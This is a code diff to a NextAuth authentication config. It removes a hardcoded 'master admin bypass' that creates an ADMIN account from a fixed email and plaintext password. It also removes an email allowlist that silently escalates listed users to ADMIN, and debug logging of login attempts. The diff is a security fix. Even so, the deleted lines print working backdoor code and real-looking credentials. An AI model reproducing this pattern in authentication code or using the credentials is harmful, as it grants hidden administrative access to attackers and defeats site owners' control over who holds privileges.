@@ -34,25 +34,6 @@ export const authOptions: NextAuthOptions = {
           throw new Error('Please enter both email and password');
         }
 
-        // --- MASTER ADMIN BYPASS (Auto-Creation) ---
-        if (credentials.email === "Blackhatsd.sd@gmail.com" && credentials.password === "Morsall@112233") {
-           let adminUser = await prisma.user.findUnique({ where: { email: credentials.email } });
-           if (!adminUser) {
-              const hashedAdminPassword = await bcrypt.hash(credentials.password, 10);
-              adminUser = await prisma.user.create({
-                 data: {
-                    email: credentials.email,
-                    name: "System Admin",
-                    password: hashedAdminPassword,
-                    role: "ADMIN",
-                    isOnboarded: true,
-                 }
-              });
-           }
-           return adminUser;
-        }
-        // -------------------------------------------
-
         const user = await prisma.user.findUnique({ where: { email: credentials.email } });
         if (!user || !user.password) throw new Error('No user found with this email');
         const isPasswordCorrect = await bcrypt.compare(credentials.password, user.password);
@@ -74,18 +55,7 @@ export const authOptions: NextAuthOptions = {
         token.interests = (user as any).interests;
       }
       
-      // 2. SOVEREIGN MASTER OVERRIDE: Authorized Super Admins
-      // 2. SOVEREIGN MASTER OVERRIDE: Authorized Super Admins
-      const masterAdmins = ["zomatube2012@gmail.com", "Blackhatsd.sd@gmail.com", "hazem@morsall.com"];
-      console.log("DEBUG: Login attempt from:", token.email);
-      
-      if (token.email && masterAdmins.includes(token.email)) {
-        token.role = "ADMIN";
-        token.isOnboarded = true;
-        console.log("DEBUG: Admin access GRANTED for:", token.email);
-      }
-
-      // 3. DYNAMIC DATA REFRESH (Runs on sign-in AND when update() is called)
+      // 2. DYNAMIC DATA REFRESH (Runs on sign-in AND when update() is called)
       const emailToFetch = token.email || user?.email;
       if (emailToFetch) {
         const dbUser = await prisma.user.findUnique({
@@ -103,12 +73,6 @@ export const authOptions: NextAuthOptions = {
           token.isVendor = !!dbUser.vendorProfile;
           token.vendorId = dbUser.vendorProfile?.id;
           token.vendorStatus = dbUser.vendorProfile?.status;
-
-          // Admin override still applies if DB is not updated yet
-          if (masterAdmins.includes(dbUser.email)) {
-            token.role = "ADMIN";
-            token.isOnboarded = true;
-          }
         }
       }
 
